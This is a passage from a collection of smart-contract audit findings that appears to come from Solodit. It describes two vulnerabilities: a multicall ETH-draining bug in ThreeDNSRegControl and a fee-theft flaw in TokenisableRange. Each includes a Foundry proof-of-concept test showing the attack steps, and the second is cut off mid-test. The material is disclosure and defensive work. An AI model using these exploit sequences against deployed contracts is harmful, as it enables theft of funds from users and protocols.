, therefore the contract's own balance is used here. Afterwards, a valid commitment is made via
makeCommitmentV2(...)
and all leftover WETH (from user + contract) is returned to the user. Please refer to the comments in the proof of concept code for a more accurate description of the attack path.
Impacts
Anyone can drain the
ThreeDNSRegControl
contract's whole ETH balance by making a valid commitment using
multicall(...)
while additionally providing the contract's balance via
msg.value
. Twice the provided balance will be returned afterwards (except for the cost of the valid commitment itself).
Processing the commitments associated with the previous ETH deposits fails due to lack of funds.
Proof of Concept
Please add the code below to
test/regcontrol/modules/TestCommitmentOrderflow.t.sol
and run it with
forge test -vv --match-test testMakeCommitment__drainFunds
:
----new code block----
import {IWETH} from "src/utils/interfaces/IWETH.sol";
// Add within ' contract TestCommitmentOrderflow '
function testMakeCommitment__drainFunds() public {
 // Add the following at the *first* line of ' function setUp() ' before ' super.setUp() '
 // vm.selectFork(vm.createFork("https://optimism-mainnet.infura.io/v3/<INSERT API KEY HERE>"));
 uint256 committedBalance = 10 ether;
 // Assume the ThreeDNSRegControl/CommitmentOrderflow/PaymentProcessor contract
 // holds 10 ETH due to previous commitments
    vm.deal(address(mc), committedBalance);
 // Assume the attacker got the same amount via a (flash-)loan
    vm.deal(address(this), committedBalance);
 // Get WETH contract for later use
    IWETH weth = IWETH(0x4200000000000000000000000000000000000006);
 // Attacker pays for own commitment in USDC
    Datastructures.OrderPayment memory payment_;
    payment_.paymentType = Datastructures.PaymentType.USDC;
    payment_.amount = BASE_REGISTRATION_AMOUNT;
 // Warp to when the signature is valid
    vm.warp(BASE_ISSUED_AT + 15);
 // Mint some USDC
    musdc.mint(address(this), BASE_REGISTRATION_AMOUNT);
 // Approve the USDC
    musdc.approve(address(mc), BASE_REGISTRATION_AMOUNT);
 // Build valid USDC commitment call
 bytes[] memory calls = new bytes[](1);
    calls[0] = abi.encodeCall(CommitmentOrderflow.makeCommitment,
        (BASE_SECRET_HASH, BASE_DURATION, payment_, BASE_ISSUED_AT,
        BASE_EXPIRES_AT, BASE_SIG_V, BASE_SIG_R, BASE_SIG_S)
    );
 // Get attacker WETH balance before attack
 uint256 balanceBefore = weth.balanceOf(address(this));
 // Perform attack via multicall by providing additional 10 ETH
    mc.multicall{ value: committedBalance }(calls);
 // Get attacker WETH balance after attack
 uint256 balanceAfter = weth.balanceOf(address(this));
 // Expect own funds (10 ETH) + contract funds (10 ETH) = 20 ETH
 // to be returned to attacker as WETH
    assertEq(balanceAfter - balanceBefore, 2 * committedBalance);
 // Attacker made a profit of 10 ETH (whole contract balance)
}
----end of code block ----
Recommendation
Currently, the
PaymentProcessor._handlePayment(...)
expects ETH to be wrapped as WETH, therefore:
makeCommitmentV2(...)
can only be called through
multicall
because it doesn't wrap the ETH itself.
makeCommitment(...)
must not be called through
multicall
because of the present double wrapping issue.
Suggestion:
Only wrap in
multicall(...)
and make the commitment methods non-payable.
Warning:
multicall(...)
is vulnerable to multi-spending due to
msg.value
forwarding.

https://solodit.cyfrin.io/issues/h-04-to.audit_content:
https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L190
https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L268
Vulnerability details
The
TokenisableRange
is designed to always collect trading fees from the Uniswap V3 pool, whenever there is a liquidity event (
deposit
or
withdraw
). These fees may be reinvested in the pool, or may be held in form of
fee0
and
fee1
ERC-20 balance held by the TokenisableRange contract.
When a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).
To prevent users from stealing fees, there are several mechanisms in place:
fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees
whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees "is not given away for free"
Both of these mechanisms can however be worked around:
the 1% check is done on the
fee0
and
fee1
amounts
compared to the theoretical pool amounts, and
not on the total value of the fees
as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.
the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees "for free".
Impact
Given a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a
deposit
and
withdraw
sequence (why not, with flash-loaned assets) to steal most of the fees (
fee0
,
fee1
) held by the pool before distribution.
Proof of Concept
Below is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:
----new code block----
 function testStolenFeesPoc() public {
        vm.createSelectFork(
 "mainnet",
 17811921
        );
​
        vm.prank(tokenWhale);
        USDC.transfer(alice, 100_000e6);
​
        vm.startPrank(alice);
        TokenisableRange tr = new TokenisableRange();
​
 // out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921); 
 // the pool will hold 0 WETH
        tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, "Test1", "T1", false);
​
        USDC.approve(address(tr), 100_000e6);
        tr.init(100_000e6, 0);
​
 // time passes, and the pool trades in range, accumulating fees
 uint256 fee0 = 1_000e6;
 uint256 fee1 = 2e18;
​
        vm.mockCall(address(UniswapV3UsdcNFPositionManager), 
 abi.encodeWithSelector(INonfungiblePositionManager.collect.selector), 
 abi.encode(fee0, fee1));
​
        vm.stopPrank();
        vm.startPrank(tokenWhale);
        USDC.transfer(address(tr), fee0);
        WETH.transfer(address(tr), fee1);
​
 // now the price is back to 1870 USDC,
 // the undistributed fees are 1k USDC and 2 WETH, 
 // in total about $5k or 5% of the pool value 
 // (the percentage can be higher with bigger price swings)
 // but still, they are not reinvested
        tr.claimFee();
        vm.clearMockedCalls();
 require(tr.fee0() != 0);
 require(tr.fee1() != 0);
​
 // an attacker now can flashloan & deposit an amount that will give them
 // the majority of the pool liquidity, then withdraw for a profit
